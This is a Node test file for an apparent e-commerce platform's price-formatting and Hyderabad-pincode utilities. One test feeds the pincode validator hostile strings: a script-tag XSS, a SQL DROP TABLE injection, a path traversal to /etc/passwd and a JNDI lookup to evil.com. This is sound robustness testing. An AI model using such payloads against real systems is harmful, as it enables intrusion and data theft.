import test from 'node:test';
import assert from 'node:assert/strict';
import { formatPriceINR } from '../lib/utils';
import { isHyderabadPincode, resolvePincodeServiceability } from '../lib/pincodes';
import { PlatformSettings } from '../types/settings';

const dummySettings: PlatformSettings = {
  id: 'platform_config',
  defaultVendorCommissionPercent: 5.0,
  platformProcessingFeePercent: 1.5,
  flatDeliveryFeeINR: 0,
  minimumOrderValueForFreeDeliveryINR: 0,
  eligiblePincodes: [],
  codEnabled: true,
  onlinePaymentEnabled: true,
  paymentGatewayProvider: 'unconfigured',
  settlementPayoutCycleDays: 7,
  settlementHoldPeriodDays: 5,
  customerCancellationWindowMinutes: 120,
  returnWindowDays: 7,
  allowItemLevelCancellation: true,
  adminSessionTimeoutMinutes: 15,
  customProductAttributes: [],
  updatedAt: new Date().toISOString(),
};

test('RESILIENCE: formatPriceINR crash immunity with non-number types', () => {
  assert.doesNotThrow(() => formatPriceINR(NaN));
  assert.strictEqual(formatPriceINR(undefined), 'Price on Request');
  assert.strictEqual(formatPriceINR(null as unknown as undefined), 'Price on Request');
});

test('RESILIENCE: isHyderabadPincode crash immunity with dangerous string inputs', () => {
  const dangerousInputs = [
    '<script>alert(1)</script>',
    '500001; DROP TABLE users;',
    '../../../etc/passwd',
    '${jndi:ldap://evil.com}',
    '   500009   ', // Should trim and validate
    '\n500003\t',
  ];

  for (const input of dangerousInputs) {
    assert.doesNotThrow(() => isHyderabadPincode(input));
  }

  // Trimmed valid inputs should pass
  assert.strictEqual(isHyderabadPincode('   500009   '), true);
  assert.strictEqual(isHyderabadPincode('\n500003\t'), true);
});

test('RESILIENCE: resolvePincodeServiceability never returns undefined properties for key fields', () => {
  const result = resolvePincodeServiceability('999999', dummySettings);
  assert.ok(typeof result.serviceable === 'boolean');
  assert.ok(typeof result.pincode === 'string');
  assert.ok(typeof result.message === 'string' && result.message.length > 0);
});

test('RESILIENCE: Zero and negative prices in cart subtotal calculation', () => {
  const items = [
    { productId: 'p1', name: 'Free item', price: 0, image: '', category: 'inverters', vendorId: 'v1', vendorName: 'V1', quantity: 2, stock: 10 },
  ];
  const subtotal = items.reduce((acc, it) => acc + Math.max(0, it.price) * it.quantity, 0);
  assert.strictEqual(subtotal, 0);
});
